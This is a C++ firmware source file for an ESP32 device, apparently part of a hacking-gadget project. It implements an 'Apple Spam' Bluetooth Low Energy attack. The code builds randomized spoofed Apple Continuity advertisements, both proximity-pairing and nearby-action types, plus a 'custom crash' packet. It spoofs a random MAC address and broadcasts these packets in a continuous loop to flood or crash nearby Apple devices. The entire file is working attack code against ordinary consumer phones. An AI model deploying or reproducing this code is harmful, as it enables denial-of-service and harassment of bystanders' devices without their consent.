#include "apple_spam.h"
#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include <globals.h>

extern void generateRandomMac(uint8_t* mac);

// Continuity Types
#define ContinuityTypeProximityPair 0x07
#define ContinuityTypeNearbyAction  0x0F
#define ContinuityTypeCustomCrash   0xFF

// Proximity Pair Models (Endianness handled in code)
static const uint16_t apple_models[] = {
    0x0E20, 0x0A20, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420,
    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920,
    0x1720, 0x1220, 0x1620
};
#define APPLE_MODEL_COUNT (sizeof(apple_models) / sizeof(apple_models[0]))

// Nearby Action Types
static const uint8_t apple_actions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B
};
#define APPLE_ACTION_COUNT (sizeof(apple_actions) / sizeof(apple_actions[0]))

static bool apple_spam_running = false;

// Randomized Packet Builders (GhostESP Logic)

static size_t build_proximity_pair(uint8_t *buf) {
    uint16_t model = apple_models[esp_random() % APPLE_MODEL_COUNT];
    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : ((esp_random() % 2) ? 0x07 : 0x01);
    uint8_t color = esp_random() % 16;
    uint8_t i = 0;

    buf[i++] = 30; // AD length (31-1)
    buf[i++] = 0xFF; // Manufacturer Specific
    buf[i++] = 0x4C; // Apple
    buf[i++] = 0x00;
    buf[i++] = ContinuityTypeProximityPair;
    buf[i++] = 25; // Length
    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x55; // Status
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);
    buf[i++] = ((esp_random() % 8) << 4) | (esp_random() % 10);
    buf[i++] = esp_random() & 0xFF;
    buf[i++] = color;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);
    i += 16;
    return i;
}

static size_t build_nearby_action(uint8_t *buf) {
    uint8_t action = apple_actions[esp_random() % APPLE_ACTION_COUNT];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 10; // AD length (11-1)
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = ContinuityTypeNearbyAction;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    return i;
}

static size_t build_custom_crash(uint8_t *buf) {
    uint8_t action = apple_actions[esp_random() % APPLE_ACTION_COUNT];
    uint8_t flags = 0xC0;
    uint8_t i = 0;
    buf[i++] = 16;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = ContinuityTypeNearbyAction;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x10;
    esp_fill_random(&buf[i], 3);
    i += 3;
    return i;
}

void startAppleSpamAll() {
    apple_spam_running = true;

    // GhostESP style: Stable MAC for Apple
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    BLEDevice::init("");
    BLEAdvertising* pAdv = BLEDevice::getAdvertising();

    drawMainBorderWithTitle("Apple Spam");
    padprintln("");
    padprintln("Randomized Cycle (GhostESP)");
    padprintln("Press ESC to stop");

    while (apple_spam_running) {
        if (check(EscPress)) {
            apple_spam_running = false;
            returnToMenu = true;
            break;
        }

        uint8_t packet[32];
        size_t len = 0;
        int r = esp_random() % 3;
        const char* type_name = "";

        if (r == 0) { len = build_proximity_pair(packet); type_name = "Pairing"; }
        else if (r == 1) { len = build_nearby_action(packet); type_name = "Action"; }
        else { len = build_custom_crash(packet); type_name = "Crash"; }

        displayTextLine(String(type_name) + " " + String(millis() / 1000) + "s");

        BLEAdvertisementData advData;
        advData.setFlags(0x06);
#ifdef NIMBLE_V2_PLUS
        advData.addData(packet, len);
#else
        std::vector<uint8_t> v(packet, packet + len);
        advData.addData(v);
#endif

        pAdv->setAdvertisementData(advData);
        pAdv->start();
        vTaskDelay(150 / portTICK_PERIOD_MS);
        pAdv->stop();
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

// Stubs for header compatibility
void appleSubMenu() { startAppleSpamAll(); }
void startAppleSpam(int i) { startAppleSpamAll(); }
void stopAppleSpam() { apple_spam_running = false; }
void quickAppleSpam(int i) { startAppleSpamAll(); }
bool isAppleSpamRunning() { return apple_spam_running; }
const char* getApplePayloadName(int i) { return "Apple All"; }
int getApplePayloadCount() { return 1; }
